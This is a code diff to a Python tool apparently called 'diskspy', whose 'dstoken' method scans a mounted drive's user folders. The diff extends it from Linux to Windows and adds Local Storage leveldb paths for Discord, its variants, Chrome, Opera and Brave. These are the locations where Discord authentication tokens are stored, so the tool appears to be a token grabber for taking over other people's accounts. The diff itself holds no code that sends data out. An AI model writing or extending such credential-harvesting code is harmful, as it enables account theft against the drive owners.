@@ -81,12 +81,30 @@ class diskspy:
 	# selected hard drive
 	def dstoken(self, disco, t):
 		t.insert(END, "Please wait...\n")
-		osuser = os.listdir(f"{disco}/home/")
+		if os.path.exists(f"{disco}/home/"):
+			# linux
+			osuser = os.listdir(f"{disco}/home/")
+		elif os.path.exists(f"{disco}/Users/"):
+			# windows
+			osuser = os.listdir(f"{disco}/Users/")
+		else:
+			# no supported operating system = quit
+			diskspy.writelogs(t, f"Cannot determine operating system.")
+			return
 		for user in osuser:
 			t.insert(END, f"Selected username: {user}\n")
 			pathlist = [
-				"/home/"+str(user).strip()+"/.config/discord/Local Storage/leveldb",
-				"/home/"+str(user).strip()+"/.config/chromium/Default/Local Storage/leveldb",
+				# linux
+				f"/home/{str(user).strip()}/.config/discord/Local Storage/leveldb",
+				f"/home/{str(user).strip()}/.config/chromium/Default/Local Storage/leveldb",
+				# windows
+				f"{disco}/Users/AppData/Roaming/LightCord/Local Storage/leveldb",
+				f"{disco}/Users/AppData/Roaming/Discord/Local Storage/leveldb",
+				f"{disco}/Users/AppData/Roaming/discordcanary/Local Storage/leveldb",
+				f"{disco}/Users/AppData/Roaming/discordptb/Local Storage/leveldb",
+				f"{disco}/Users/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
+				f"{disco}/Users/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb",
+				f"{disco}/Users/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
 			]
 			for p in pathlist:
 				if os.path.exists(p):
